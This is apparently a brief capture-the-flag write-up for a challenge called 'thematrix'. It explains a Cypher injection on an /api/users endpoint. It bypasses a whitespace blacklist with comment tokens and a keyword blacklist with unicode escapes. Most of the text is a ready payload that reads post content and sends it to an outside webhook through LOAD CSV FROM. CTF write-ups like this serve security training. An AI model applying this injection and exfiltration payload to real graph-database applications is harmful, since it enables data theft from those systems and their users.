# Writeup thematrix

Cypher injection on `/api/users` endpoint. Bypass whitespace blacklist with multiline comments and bypass `NETSOS` blacklist with unicode escape.

Payload (needs to be URL encoded):
```
alicechang"})match/**/(p:Post)/**/where/**/p.content/**/contains/**/"\u004E\u0045\u0054\u0053\u004F\u0053"/**/load/**/csv/**/from/**/"<WEBHOOK_URL>/"+p.content/**/as/**/x/**/return/**/u/**///
```
